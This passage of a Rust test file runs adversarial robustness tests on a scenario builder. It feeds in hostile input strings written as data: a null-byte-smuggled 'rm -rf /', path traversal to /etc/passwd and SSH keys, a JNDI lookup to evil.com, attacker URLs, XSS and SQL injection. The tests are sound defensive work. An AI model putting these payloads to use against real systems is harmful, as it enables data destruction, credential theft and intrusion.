            "\u{202E}REVERSED_LOGIC\u{202D}",
            "\u{200B}INVISIBLE_CONDITION",
            "\u{FEFF}BOM_INJECTION",
            "\u{034F}COMBINING_ATTACK",
            // XML/JSON injection
            "</condition><evil>injected</evil><condition>",
            "\"condition\": true, \"injected\": \"evil\"",
            "<?xml version='1.0'?><evil>injection</evil>",
            // Buffer overflow simulation
            "A".repeat(100000),
            "\x00".repeat(1000),
            "\u{00FF}".repeat(1000),
            // Null byte injection
            "valid_condition\x00evil_payload",
            "\x00; rm -rf /",
            "condition\x00\x01\x02\x03",
            // Control character flood
            "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F",
            "\x1B[31mRED_ALERT\x1B[0m",
            "\r\nINJECTED_LINE\r\n",
            // Path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\cmd.exe",
            "/proc/self/environ",
            // Environment variable injection
            "${PATH}",
            "$HOME/.ssh/id_rsa",
            "${IFS}injection",
            // Network injection
            "http://evil.com/payload",
            "ftp://attacker.com/backdoor",
            "file:///etc/passwd",
        ];

        for (bomb_idx, malicious_condition) in logic_bomb_conditions.iter().enumerate() {
            println!(
                "Testing logic bomb assertion {}: {}",
                bomb_idx,
                if malicious_condition.len() > 50 {
                    format!("{}...", &malicious_condition[..50])
                } else {
                    malicious_condition.to_string()
                }
            );

            // Create isolated builder for each logic bomb test
            let mut bomb_builder = ScenarioBuilder::new(&format!("logic_bomb_test_{}", bomb_idx));
            bomb_builder.add_node("target_node");
            bomb_builder.set_seed(222222 + bomb_idx as u64);

            // Attempt to inject malicious assertion condition
            let bomb_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                bomb_builder.add_assertion(
                    &format!("bomb_assertion_{}", bomb_idx),
                    "target_node",
                    malicious_condition,
                );
                bomb_builder.build()
            }));

            match bomb_result {
                Ok(build_result) => {
                    match build_result {
                        Ok(scenario) => {
                            // If logic bomb is accepted, verify it's handled safely
                            let assertions = scenario.assertions();

                            for (assertion_id, assertion) in assertions {
                                // Verify no command execution in assertion condition
                                assert!(
                                    !assertion.condition.contains("rm -rf"),
                                    "Bomb {}: Command injection should not be in assertion condition",
                                    bomb_idx
                                );
                                assert!(
                                    !assertion.condition.contains("eval("),
                                    "Bomb {}: Code injection should not be in assertion condition",
                                    bomb_idx
                                );
                                assert!(
                                    !assertion.condition.contains("DROP TABLE"),
                                    "Bomb {}: SQL injection should not be in assertion condition",
                                    bomb_idx
                                );

                                // Verify condition string safety
                                assert!(
                                    !assertion.condition.contains('\0'),
                                    "Bomb {}: Assertion condition should not contain null bytes",
                                    bomb_idx
                                );
                                assert!(
                                    assertion.condition.len() <= 100000,
                                    "Bomb {}: Assertion condition should have reasonable length limit",
                                    bomb_idx
                                );

                                // Verify assertion ID safety
                                assert!(
                                    !assertion_id.contains('\0'),
                                    "Bomb {}: Assertion ID should not contain null bytes",
                                    bomb_idx
                                );
                                assert!(
                                    !assertion_id.contains(".."),
                                    "Bomb {}: Assertion ID should not contain path traversal",
                                    bomb_idx
                                );
                            }

                            // Test scenario serialization safety
                            let serialize_result = serde_json::to_string(&scenario);
                            match serialize_result {
                                Ok(json) => {
                                    // Verify no injection in serialized output
                                    assert!(
                                        !json.contains("rm -rf"),
                                        "Bomb {}: JSON should not contain command injection",
                                        bomb_idx
                                    );
                                    assert!(
                                        !json.contains("eval("),
                                        "Bomb {}: JSON should not contain code injection",
                                        bomb_idx
                                    );
                                    assert!(
                                        !json.contains('\0'),
                                        "Bomb {}: JSON should not contain null bytes",
                                        bomb_idx
                                    );

                                    // Verify JSON structure integrity
                                    let parse_back_result: Result<serde_json::Value, _> =
                                        serde_json::from_str(&json);
                                    assert!(
                                        parse_back_result.is_ok(),
                                        "Bomb {}: Serialized JSON should parse back correctly",
                                        bomb_idx
                                    );
                                }
                                Err(e) => {
                                    println!(
                                        "Bomb {}: Serialization failed safely: {}",
                                        bomb_idx, e
                                    );
                                }
                            }
                        }
                        Err(e) => {
                            // Expected behavior - malicious assertion should be rejected
                            let error_msg = e.to_string();
                            assert!(
                                !error_msg.contains('\0'),
                                "Bomb {}: Error message should not contain null bytes",
                                bomb_idx
                            );
                            assert!(
                                !error_msg.is_empty(),
                                "Bomb {}: Error should provide meaningful message",
                                bomb_idx
                            );
                            assert!(
                                error_msg.len() <= 1000,
                                "Bomb {}: Error message should have reasonable length",
                                bomb_idx
                            );
                            println!("Bomb {} rejected: {}", bomb_idx, error_msg);
                        }
                    }
                }
                Err(_) => {
                    // Panic during logic bomb injection - handled by catch_unwind
                    println!("Bomb {} caused panic (safely caught)", bomb_idx);
                }
            }

            // Test that system remains functional after logic bomb attempt
            let mut recovery_builder =
                ScenarioBuilder::new(&format!("post_bomb_recovery_{}", bomb_idx));
            recovery_builder.add_node("recovery_node");
            recovery_builder.add_assertion("safe_assertion", "recovery_node", "true");
            recovery_builder.set_seed(333333 + bomb_idx as u64);

            let recovery_result = recovery_builder.build();
            assert!(
                recovery_result.is_ok(),
                "Bomb {}: System should recover after logic bomb attempt",
                bomb_idx
            );
        }

        // Test assertion condition length limits
        let length_bomb_conditions = [
            "a".repeat(1000),
            "b".repeat(10000),
            "c".repeat(100000),
            "condition_".repeat(10000),
        ];

        for (len_idx, length_condition) in length_bomb_conditions.iter().enumerate() {
            let mut length_builder = ScenarioBuilder::new(&format!("length_bomb_{}", len_idx));
            length_builder.add_node("length_node");
            length_builder.add_assertion(
                &format!("length_assertion_{}", len_idx),
                "length_node",
                length_condition,
            );
            length_builder.set_seed(444444 + len_idx as u64);

            let length_result = length_builder.build();

            // Very long conditions should be handled appropriately
            match length_result {
                Ok(scenario) => {
                    // If accepted, verify length is managed safely
                    let assertions = scenario.assertions();
                    for (_, assertion) in assertions {
                        assert!(
                            assertion.condition.len() <= 100000,
                            "Length bomb {}: Condition length should be limited",
                            len_idx
                        );
                    }
                }
                Err(e) => {
                    // Rejection due to length limits is acceptable
                    println!("Length bomb {} rejected: {}", len_idx, e);
                }
            }
        }

        println!(
            "Logic bomb injection test completed: {} malicious conditions + {} length bombs tested",
            logic_bomb_conditions.len(),
            length_bomb_conditions.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_seed_predictability_manipulation() {
        // Test seed predictability attacks where attacker manipulates scenario seeds
        // to create predictable or exploitable test execution patterns

        // Test seed collision and predictability attacks
        let predictability_seeds = [
            0,                     // Zero seed (should be rejected)
            1,                     // Minimal seed (predictable)
            u64::MAX,              // Maximum seed
            0x0000000000000001,    // Low entropy
            0x1111111111111111,    // Pattern repetition
            0x0123456789ABCDEF,    // Sequential pattern
            0xAAAAAAAAAAAAAAAAu64, // Alternating bits
            0x5555555555555555,    // Inverse alternating bits
            0xDEADBEEFDEADBEEF,    // Known constant repetition
            0x8000000000000000,    // Single high bit
            0x7FFFFFFFFFFFFFFF,    // All bits except high
        ];

        let mut seed_collision_map = std::collections::HashMap::new();

        for (seed_idx, test_seed) in predictability_seeds.iter().enumerate() {
            let mut seed_builder = ScenarioBuilder::new(&format!("seed_test_{}", seed_idx));
            seed_builder.add_node("seed_node_a");
            seed_builder.add_node("seed_node_b");
            seed_builder.add_link("seed_link", "seed_node_a", "seed_node_b");

            // Test seed setting and validation
            let seed_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                seed_builder.set_seed(*test_seed);
                seed_builder.build()
            }));

            match seed_result {
                Ok(build_result) => {
                    match build_result {
                        Ok(scenario) => {
                            let actual_seed = scenario.seed();

                            // Verify zero seed handling
                            if *test_seed == 0 {
                                assert_ne!(
                                    actual_seed, 0,
                                    "Seed {}: Zero seed should be rejected or replaced",
                                    seed_idx
                                );
                            } else {
                                assert_eq!(
                                    actual_seed, *test_seed,
                                    "Seed {}: Non-zero seed should be preserved",
                                    seed_idx
                                );
                            }

                            // Track seed usage for collision detection
                            if let Some(prev_idx) = seed_collision_map.insert(actual_seed, seed_idx)
                            {
                                if prev_idx != seed_idx {
                                    println!(
                                        "WARNING: Seed collision detected: seed {} used by both test {} and {}",
                                        actual_seed, prev_idx, seed_idx
                                    );
                                }
                            }

                            // Test determinism with repeated builds
                            for repeat in 0..5 {
                                let mut repeat_builder = ScenarioBuilder::new(&format!(
                                    "repeat_{}_{}",
                                    seed_idx, repeat
                                ));
                                repeat_builder.add_node("seed_node_a");
                                repeat_builder.add_node("seed_node_b");
                                repeat_builder.add_link("seed_link", "seed_node_a", "seed_node_b");
                                repeat_builder.set_seed(*test_seed);

                                let repeat_result = repeat_builder.build();
                                if let Ok(repeat_scenario) = repeat_result {
                                    // Same seed should produce deterministic results
                                    assert_eq!(
                                        repeat_scenario.seed(),
                                        scenario.seed(),
                                        "Seed {}: Determinism check {} failed",
                                        seed_idx,
                                        repeat
                                    );

                                    // Verify scenario structure determinism
                                    assert_eq!(
                                        repeat_scenario.nodes().len(),
                                        scenario.nodes().len(),
                                        "Seed {}: Node count should be deterministic",
                                        seed_idx
                                    );
                                    assert_eq!(
                                        repeat_scenario.links().len(),
                                        scenario.links().len(),
                                        "Seed {}: Link count should be deterministic",
                                        seed_idx
                                    );
                                }
                            }

                            println!(
                                "Seed test {}: seed 0x{:016X} -> actual 0x{:016X}",
                                seed_idx, test_seed, actual_seed
                            );
                        }
                        Err(e) => {
                            // Zero seed should be rejected
                            if *test_seed == 0 {
                                assert!(
                                    e.to_string().contains("NO_SEED")
                                        || e.to_string().contains("zero"),
                                    "Seed {}: Zero seed should be rejected with appropriate error",
                                    seed_idx
                                );
                            } else {
                                println!("Seed {} rejected: {}", seed_idx, e);
                            }
                        }
                    }
                }
                Err(_) => {
                    println!("Seed {} caused panic (safely caught)", seed_idx);
                }
            }
        }

        // Test seed entropy and randomness properties
        let mut entropy_seeds = Vec::new();
        for i in 0..100 {
            // Generate seeds with varying bit patterns to avoid rand dependency
            let entropy_seed = (((i * 17 + 23) as u64) << 32) | ((i * 31 + 47) as u64);
            entropy_seeds.push(entropy_seed | 1); // Ensure non-zero
        }

        let mut successful_entropy_builds = 0;
        for (entropy_idx, entropy_seed) in entropy_seeds.iter().enumerate() {
            let mut entropy_builder =
                ScenarioBuilder::new(&format!("entropy_test_{}", entropy_idx));
            entropy_builder.add_node("entropy_node");
            entropy_builder.set_seed(*entropy_seed);

            if let Ok(entropy_scenario) = entropy_builder.build() {
                successful_entropy_builds += 1;

                // Verify seed preservation
                assert_eq!(
                    entropy_scenario.seed(),
                    *entropy_seed,
                    "Entropy seed {} should be preserved",
                    entropy_idx
                );

                // Test seed serialization and deserialization
                let serialize_result = serde_json::to_string(&entropy_scenario);
                assert!(
                    serialize_result.is_ok(),
                    "Entropy scenario {} should serialize successfully",
                    entropy_idx
                );

                if let Ok(serialized) = serialize_result {
                    // Verify seed is present in serialized form
                    assert!(
                        serialized.contains(&format!("{}", entropy_seed)),
                        "Entropy seed {} should appear in serialized JSON",
                        entropy_idx
                    );

                    // Test deserialization
                    let deserialize_result: Result<Scenario, _> = serde_json::from_str(&serialized);
                    if let Ok(deserialized_scenario) = deserialize_result {
                        assert_eq!(
                            deserialized_scenario.seed(),
                            *entropy_seed,
                            "Entropy seed {} should survive serialization round-trip",
                            entropy_idx
                        );
                    }
                }
            }
        }

        println!(
            "Entropy test: {}/{} seeds processed successfully",
            successful_entropy_builds,
            entropy_seeds.len()
        );

        // Test seed manipulation via external modification
        let mut manipulation_builder = ScenarioBuilder::new("seed_manipulation_test");
        manipulation_builder.add_node("manipulation_node");
        manipulation_builder.set_seed(0x1337DEADBEEF1337);

        let manipulation_result = manipulation_builder.build();
        if let Ok(scenario) = manipulation_result {
            // Verify scenario immutability (seed cannot be changed after build)
            assert_eq!(
                scenario.seed(),
                0x1337DEADBEEF1337,
                "Original seed should be preserved in built scenario"
            );

            // Test that built scenario maintains seed integrity
            let json = serde_json::to_string(&scenario).unwrap();
            let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();

            if let Some(seed_value) = parsed.get("seed").and_then(|v| v.as_u64()) {
                assert_eq!(
                    seed_value, 0x1337DEADBEEF1337,
                    "Seed should be correctly preserved in JSON serialization"
                );
            }
        }

        println!(
            "Seed predictability test completed: {} predictability patterns + {} entropy tests + immutability verification",
            predictability_seeds.len(),
            entropy_seeds.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_json_serialization_corruption() {
        // Test JSON serialization corruption attacks where attacker crafts
        // scenarios designed to produce malformed or exploitable JSON output

        let mut base_builder = ScenarioBuilder::new("json_corruption_test");
        base_builder.add_node("json_node");
        base_builder.set_seed(555555);

        // JSON injection attack patterns in various scenario components
        let json_corruption_attacks = [
            // Object key injection attempts
            (
                "node\",\"injected\":\"evil",
                "JSON key injection in node name",
            ),
            (
                "node\\\":{\"payload\":\"evil\"}//",
                "Escaped quote injection",
            ),
            ("node\x22malicious\x22", "Raw quote character injection"),
            // JSON structure corruption
            (
                "node}],\"injected\":[{\"evil",
                "Structure breaking injection",
            ),
            (
                "node\n},\n{\"evil\":\"payload\"",
                "Newline-based structure injection",
            ),
            (
                "node\"},\"corrupted\":true,\"original\":{\"node",
                "Complete object injection",
            ),
            // Unicode JSON corruption
            ("node\u{0022}injected\u{0022}", "Unicode quote injection"),
            (
                "node\u{005C}u0022evil\u{005C}u0022",
                "Escaped unicode injection",
            ),
            ("node\u{000A}evil\u{000A}", "Unicode newline injection"),
            // Control character corruption
            ("node\x08\x09\x0A\x0C\x0D", "Control character flood"),
            ("node\x1B[0mRESET\x1B[31mRED", "ANSI escape in JSON"),
            ("node\x00NULL_TERMINATION", "Null byte injection"),
            // Number format corruption
            ("node123.456e789", "Extreme number formatting"),
            ("node-Infinity", "Negative infinity injection"),
            ("nodeNaN", "NaN value injection"),
            // String escape corruption
            ("node\\n\\r\\t\\f\\b", "Escape sequence injection"),
            ("node\\/\\/comment_injection", "Comment-style injection"),
            ("node\\u0000\\u0001\\u0002", "Unicode escape injection"),
            // Array/Object injection
            ("node[],\"injected_array\":[", "Array injection attempt"),
            ("node{},\"injected_object\":{", "Object injection attempt"),
            (
                "node\":[1,2,3],\"evil\":[4,5,6],\"node",
                "Complex injection",
            ),
        ];

        for (attack_idx, (malicious_name, attack_description)) in
            json_corruption_attacks.iter().enumerate()
        {
            println!(
                "Testing JSON corruption attack {}: {}",
                attack_idx, attack_description
            );

            // Test node name corruption
            let mut node_attack_builder =
                ScenarioBuilder::new(&format!("json_attack_node_{}", attack_idx));
            node_attack_builder.add_node(malicious_name);
            node_attack_builder.set_seed(666666 + attack_idx as u64);

            let node_attack_result = node_attack_builder.build();

            match node_attack_result {
                Ok(scenario) => {
                    // Test JSON serialization safety
                    let serialize_result = serde_json::to_string(&scenario);

                    match serialize_result {
                        Ok(json) => {
                            // Verify no JSON structure corruption
                            assert!(
                                !json.contains("\"injected\":"),
                                "Node attack {}: JSON should not contain injected fields",
                                attack_idx
                            );
                            assert!(
                                !json.contains("\"evil\":"),
                                "Node attack {}: JSON should not contain evil payloads",
                                attack_idx
                            );
                            assert!(
                                !json.contains("\"corrupted\":true"),
                                "Node attack {}: JSON should not contain corruption markers",
                                attack_idx
                            );

                            // Verify JSON structural integrity
                            let parse_back_result: Result<serde_json::Value, _> =
                                serde_json::from_str(&json);
                            assert!(
                                parse_back_result.is_ok(),
                                "Node attack {}: Corrupted JSON should still parse correctly",
                                attack_idx
                            );

                            if let Ok(parsed) = parse_back_result {
                                // Verify parsed structure doesn't contain injected content
                                let json_str = parsed.to_string();
                                assert!(
                                    !json_str.contains("injected"),
                                    "Node attack {}: Parsed JSON should not contain injected content",
                                    attack_idx
                                );
                                assert!(
                                    !json_str.contains("evil"),
                                    "Node attack {}: Parsed JSON should not contain evil content",
                                    attack_idx
                                );
                            }

                            // Test pretty-printed JSON safety
                            let pretty_result = serde_json::to_string_pretty(&scenario);
                            if let Ok(pretty_json) = pretty_result {
                                assert!(
                                    !pretty_json.contains("\"injected\":"),
                                    "Node attack {}: Pretty JSON should not contain injected fields",
                                    attack_idx
                                );
                                let pretty_parse: Result<serde_json::Value, _> =
                                    serde_json::from_str(&pretty_json);
                                assert!(
                                    pretty_parse.is_ok(),
                                    "Node attack {}: Pretty JSON should parse correctly",
                                    attack_idx
                                );
                            }
                        }
                        Err(e) => {
                            // Serialization failure is acceptable for malformed input
                            println!(
                                "Node attack {}: Serialization failed safely: {}",
                                attack_idx, e
                            );
                            let error_msg = e.to_string();
                            assert!(
                                !error_msg.contains('\0'),
                                "Node attack {}: Error should not contain null bytes",
                                attack_idx
                            );
                        }
                    }
                }
                Err(e) => {
                    // Rejection of malicious input is expected behavior
                    println!("Node attack {} rejected: {}", attack_idx, e);
                }
            }

            // Test link name corruption
            if malicious_name.len() < 100 {
                // Skip extremely long names for link tests
                let mut link_attack_builder =
                    ScenarioBuilder::new(&format!("json_attack_link_{}", attack_idx));
                link_attack_builder.add_node("node_a");
                link_attack_builder.add_node("node_b");
                link_attack_builder.add_link(malicious_name, "node_a", "node_b");
                link_attack_builder.set_seed(777777 + attack_idx as u64);

                let link_attack_result = link_attack_builder.build();

                if let Ok(link_scenario) = link_attack_result {
                    let link_serialize_result = serde_json::to_string(&link_scenario);

                    match link_serialize_result {
                        Ok(link_json) => {
                            // Verify link corruption doesn't affect JSON integrity
                            assert!(
                                !link_json.contains("\"injected\":"),
                                "Link attack {}: JSON should not contain injected fields",
                                attack_idx
                            );

                            let link_parse_back: Result<serde_json::Value, _> =
                                serde_json::from_str(&link_json);
                            assert!(
                                link_parse_back.is_ok(),
                                "Link attack {}: JSON should parse back correctly",
                                attack_idx
                            );
                        }
                        Err(e) => {
                            println!(
                                "Link attack {}: Serialization failed safely: {}",
                                attack_idx, e
                            );
                        }
                    }
                }
            }

            // Test assertion name corruption
            if malicious_name.len() < 100 {
                let mut assertion_attack_builder =
                    ScenarioBuilder::new(&format!("json_attack_assertion_{}", attack_idx));
                assertion_attack_builder.add_node("assertion_node");
                assertion_attack_builder.add_assertion(
                    malicious_name,
                    "assertion_node",
                    "test_condition",
                );
                assertion_attack_builder.set_seed(888888 + attack_idx as u64);

                let assertion_attack_result = assertion_attack_builder.build();

                if let Ok(assertion_scenario) = assertion_attack_result {
                    let assertion_serialize_result = serde_json::to_string(&assertion_scenario);

                    match assertion_serialize_result {
                        Ok(assertion_json) => {
                            // Verify assertion corruption doesn't compromise JSON
                            assert!(
                                !assertion_json.contains("\"injected\":"),
                                "Assertion attack {}: JSON should not contain injected fields",
                                attack_idx
                            );

                            let assertion_parse_back: Result<serde_json::Value, _> =
                                serde_json::from_str(&assertion_json);
                            assert!(
                                assertion_parse_back.is_ok(),
                                "Assertion attack {}: JSON should parse back correctly",
                                attack_idx
                            );
                        }
                        Err(e) => {
                            println!(
                                "Assertion attack {}: Serialization failed safely: {}",
                                attack_idx, e
                            );
                        }
                    }
                }
            }
        }

        // Test scenario name corruption
        for (name_attack_idx, (malicious_scenario_name, _)) in
            json_corruption_attacks.iter().take(5).enumerate()
        {
            if malicious_scenario_name.len() < 100 {
                let mut name_attack_builder = ScenarioBuilder::new(malicious_scenario_name);
                name_attack_builder.add_node("safe_node");
                name_attack_builder.set_seed(999999 + name_attack_idx as u64);

                let name_attack_result = name_attack_builder.build();

                if let Ok(name_scenario) = name_attack_result {
                    let name_serialize_result = serde_json::to_string(&name_scenario);

                    match name_serialize_result {
                        Ok(name_json) => {
                            // Verify scenario name corruption is handled
                            let name_parse_back: Result<serde_json::Value, _> =
                                serde_json::from_str(&name_json);
                            assert!(
                                name_parse_back.is_ok(),
                                "Scenario name attack {}: JSON should parse correctly",
                                name_attack_idx
                            );

                            // Check that malicious scenario name doesn't break structure
                            if let Ok(parsed) = name_parse_back {
                                if let Some(parsed_name) =
                                    parsed.get("name").and_then(|v| v.as_str())
                                {
                                    // Name should be properly escaped/sanitized
                                    assert!(
                                        !parsed_name.contains("\"injected\":"),
                                        "Scenario name attack {}: Parsed name should not contain injection",
                                        name_attack_idx
                                    );
                                }
                            }
                        }
                        Err(e) => {
                            println!(
                                "Scenario name attack {}: Serialization failed safely: {}",
                                name_attack_idx, e
                            );
                        }
                    }
                }
            }
        }

        // Test massive JSON stress (potential memory exhaustion via JSON)
        let mut massive_builder = ScenarioBuilder::new("massive_json_test");
        for i in 0..50 {
            massive_builder.add_node(&format!(
                "massive_node_{}_with_long_name_{}",
                i,
                "x".repeat(100)
            ));
        }
        massive_builder.set_seed(1234567);

        let massive_result = massive_builder.build();
        if let Ok(massive_scenario) = massive_result {
            use std::time::{Duration, Instant};

            let serialize_start = Instant::now();
            let massive_serialize_result = serde_json::to_string(&massive_scenario);
            let serialize_duration = serialize_start.elapsed();

            // Verify serialization completes in reasonable time
            assert!(
                serialize_duration < Duration::from_secs(5),
                "Massive JSON serialization should complete in reasonable time: {:?}",
                serialize_duration
            );

            match massive_serialize_result {
                Ok(massive_json) => {
                    // Verify JSON size is reasonable
                    assert!(
                        massive_json.len() < 10_000_000,
                        "Massive JSON should not exceed reasonable size limit: {} bytes",
                        massive_json.len()
                    );

                    // Test parse-back performance
                    let parse_start = Instant::now();
                    let parse_result: Result<serde_json::Value, _> =
                        serde_json::from_str(&massive_json);
                    let parse_duration = parse_start.elapsed();

                    assert!(
                        parse_duration < Duration::from_secs(3),
                        "Massive JSON parsing should complete in reasonable time: {:?}",
                        parse_duration
                    );
                    assert!(
                        parse_result.is_ok(),
                        "Massive JSON should parse back successfully"
                    );

                    println!(
                        "Massive JSON test: {} bytes serialized in {:?}, parsed in {:?}",
                        massive_json.len(),
                        serialize_duration,
                        parse_duration
                    );
                }
                Err(e) => {
                    println!("Massive JSON serialization failed safely: {}", e);
                }
            }
        }

        println!(
            "JSON serialization corruption test completed: {} attack vectors + scenario name attacks + massive JSON stress test",
            json_corruption_attacks.len()
        );
    }

    #[cfg(test)]
    mod scenario_builder_comprehensive_attack_vector_and_boundary_tests {
        use super::*;
        use std::collections::HashMap;

        #[test]
        fn test_scenario_name_injection_and_boundary_attacks() {
            // Attack 1: Name injection attempts with malicious content
            let malicious_names = vec![
                "",                                                 // Empty name
                "../../etc/passwd",                                 // Path traversal
                "${jndi:ldap://evil.com}",                          // JNDI injection
                "\x00\x01\u{00FF}\x7F",                             // Binary data
                "name_with\nlines\rand\ttabs",                      // Control characters
                "very_long_name_".repeat(10000),                    // Memory exhaustion
                "unicode_🦀_🔒_⚡_name",                            // Unicode injection
                r#"","injected_field":"malicious_value","evil":""#, // JSON injection
                "<script>alert('xss')</script>",                    // XSS attempt
                "DROP TABLE scenarios;--",                          // SQL injection attempt
            ];

            for malicious_name in malicious_names {
                let builder = ScenarioBuilder::new(malicious_name.clone());

                // Should preserve malicious name without execution
                assert_eq!(builder.name, malicious_name);

                // Try to build with minimal valid structure
                let build_result = builder
                    .seed(42)
                    .add_node("node1", "Node 1", NodeRole::Verifier)
                    .and_then(|b| b.add_node("node2", "Node 2", NodeRole::Proposer))
                    .and_then(|b| b.build());

                // Should either succeed with preserved malicious name or fail with proper error
                match build_result {
                    Ok(scenario) => {
                        assert_eq!(
                            scenario.name(),
                            malicious_name,
                            "Built scenario should preserve name"
                        );
                        assert!(scenario.nodes().len() >= 2, "Should have required nodes");
                    }
                    Err(ScenarioBuilderError::EmptyName) if malicious_name.is_empty() => {
                        // Expected for empty name
                    }
                    Err(_) => {
                        // Other validation errors are acceptable
                    }
                }
            }

            // Attack 2: Description field injection attacks
            let malicious_descriptions = vec![
                "x".repeat(1_000_000),                          // 1MB description
                "\x00\x01\x02\x03\x04\x05",                     // Null bytes and control chars
                "desc with\r\nCRLF\r\ninjection",               // CRLF injection
                r#"{"injected": "json", "in": "description"}"#, // JSON in description
                "desc_".repeat(100000),                         // Very long description
            ];

            for desc in malicious_descriptions {
                let builder = ScenarioBuilder::new("test_scenario")
                    .description(desc.clone())
                    .seed(42);

                assert_eq!(builder.description, desc);

                // Try to build valid scenario with malicious description
                let build_result = builder
                    .add_node("node1", "Node 1", NodeRole::Verifier)
                    .and_then(|b| b.add_node("node2", "Node 2", NodeRole::Proposer))
                    .and_then(|b| b.build());

                if build_result.is_ok() {
                    let scenario = build_result.unwrap();
                    assert_eq!(
                        scenario.description(),
                        desc,
                        "Description should be preserved"
                    );
                }
            }

            // Attack 3: Seed manipulation and overflow attacks
            let seed_attacks = vec![
                0,                                        // Zero seed (should fail validation)
                u64::MAX,                                 // Maximum seed
                1,                                        // Minimum valid seed
                u64::MAX / 2,                             // Midpoint seed
                12345678901234567890_u64.wrapping_add(1), // Potential overflow
            ];

            for seed_val in seed_attacks {
                let build_result = ScenarioBuilder::new("seed_test")
                    .seed(seed_val)
                    .add_node("node1", "Node 1", NodeRole::Verifier)
                    .and_then(|b| b.add_node("node2", "Node 2", NodeRole::Proposer))
                    .and_then(|b| b.build());

                if seed_val == 0 {
                    // Zero seed should fail
                    assert!(build_result.is_err(), "Zero seed should fail validation");
                    if let Err(ScenarioBuilderError::NoSeed) = build_result {
                        // Expected error
                    } else {
                        panic!("Expected NoSeed error for zero seed");
                    }
                } else {
                    // Non-zero seeds should succeed
                    if build_result.is_ok() {
                        let scenario = build_result.unwrap();
                        assert_eq!(scenario.seed(), seed_val, "Seed should be preserved");
                    }
                }
            }
        }

        #[test]
        fn test_virtual_node_boundary_and_injection_attacks() {
            // Attack 1: Node count boundary testing
            let mut builder = ScenarioBuilder::new("node_boundary_test").seed(42);

            // Test minimum node count
            let minimal_build = builder
                .clone()
                .add_node("node1", "Node 1", NodeRole::Verifier)
                .and_then(|b| b.build());
            assert!(minimal_build.is_err(), "Should fail with too few nodes");

            // Test maximum node count + 1
            let mut max_builder = ScenarioBuilder::new("max_nodes_test").seed(42);
            for i in 0..=MAX_NODES {
                let add_result = max_builder.add_node(
                    format!("node_{}", i),
                    format!("Node {}", i),
                    NodeRole::Verifier,
                );

                if i <= MAX_NODES_CAP {
                    max_builder = add_result.expect("Should be able to add node within capacity");
                } else {
                    assert!(add_result.is_err(), "Should fail when exceeding capacity");
                    break;
                }
            }

            // Attack 2: Node ID injection attacks
            let malicious_node_ids = vec![
                "", // Empty ID
                "../../etc/passwd",
                "${jndi:ldap://evil.com}",
                "\x00\x01\u{00FF}\x7F",
                "id_with\nlines\rand\ttabs",
                "very_long_id_".repeat(1000),
                "unicode_🦀_id",
                r#"","malicious":"field"#,
                "duplicate_id", // Will be used twice
            ];

            for (i, malicious_id) in malicious_node_ids.iter().enumerate() {
                let add_result = ScenarioBuilder::new("node_id_test").seed(42).add_node(
                    malicious_id.clone(),
                    format!("Node {}", i),
                    NodeRole::Verifier,
                );

                match add_result {
                    Ok(updated_builder) => {
                        // Should preserve malicious ID
                        let node = &updated_builder.nodes[0];
                        assert_eq!(node.id, *malicious_id, "Node ID should be preserved");
                    }
                    Err(_) => {
                        // Some malicious IDs might fail validation
                    }
                }
            }

            // Attack 3: Duplicate node ID detection
            let mut duplicate_builder = ScenarioBuilder::new("duplicate_test").seed(42);
            let duplicate_id = "duplicate_node";

            // Add first node with ID
            duplicate_builder = duplicate_builder
                .add_node(duplicate_id, "First Node", NodeRole::Verifier)
                .expect("First node should be added successfully");

            // Try to add second node with same ID
            let duplicate_result =
                duplicate_builder.add_node(duplicate_id, "Second Node", NodeRole::Proposer);
            assert!(
                duplicate_result.is_err(),
                "Duplicate node ID should be rejected"
            );

            if let Err(ScenarioBuilderError::DuplicateNode { node_id }) = duplicate_result {
                assert_eq!(node_id, duplicate_id, "Error should contain duplicate ID");
            } else {
                panic!("Expected DuplicateNode error");
            }

            // Attack 4: Node name injection attacks
            let malicious_node_names = vec![
                "normal_name",
                "", // Empty name
                "name_with_\x00_nulls",
                "very_long_name_".repeat(5000),
                "unicode_name_🔒_⚡_🦀",
                "\r\nCRLF\r\ninjection",
                "<script>alert('node')</script>",
            ];

            for (i, name) in malicious_node_names.iter().enumerate() {
                let add_result = ScenarioBuilder::new("node_name_test").seed(42).add_node(
                    format!("node_{}", i),
                    name.clone(),
                    NodeRole::Verifier,
                );

                if let Ok(updated_builder) = add_result {
                    let node = &updated_builder.nodes[0];
                    assert_eq!(node.name, *name, "Node name should be preserved");
                }
            }

            // Attack 5: Node role exhaustive testing
            let all_roles = vec![NodeRole::Verifier, NodeRole::Proposer, NodeRole::Observer];

            for role in all_roles {
                let role_result = ScenarioBuilder::new("role_test")
                    .seed(42)
                    .add_node("test_node", "Test Node", role.clone())
                    .and_then(|b| b.add_node("test_node2", "Test Node 2", NodeRole::Verifier))
                    .and_then(|b| b.build());

                if let Ok(scenario) = role_result {
                    let node = &scenario.nodes()[0];
                    assert_eq!(node.role, role, "Node role should match");
                }
            }
        }

        #[test]
        fn test_virtual_link_injection_and_topology_attacks() {
            // Attack 1: Link endpoint validation bypass attempts
            let mut base_builder = ScenarioBuilder::new("link_test")
                .seed(42)
                .add_node("node1", "Node 1", NodeRole::Verifier)
                .expect("Should add node1")
                .add_node("node2", "Node 2", NodeRole::Proposer)
                .expect("Should add node2");

            // Try links with invalid endpoints
            let invalid_endpoints = vec![
                ("nonexistent1", "node1"),            // First endpoint doesn't exist
                ("node1", "nonexistent2"),            // Second endpoint doesn't exist
                ("nonexistent1", "nonexistent2"),     // Both endpoints don't exist
                ("", "node1"),                        // Empty first endpoint
                ("node1", ""),                        // Empty second endpoint
                ("", ""),                             // Both endpoints empty
                ("../../etc/passwd", "node1"),        // Path traversal in endpoint
                ("node1", "${jndi:ldap://evil.com}"), // Injection in endpoint
            ];

            for (from, to) in invalid_endpoints {
                let link_result = base_builder.clone().add_link(
                    "test_link",
                    from,
                    to,
                    LinkFaultConfig::default(),
                );

                // Should fail with invalid endpoint error
                assert!(
                    link_result.is_err(),
                    "Invalid link endpoints should be rejected"
                );

                if let Err(ScenarioBuilderError::InvalidLinkEndpoint {
                    link_id,
                    from_node,
                    to_node,
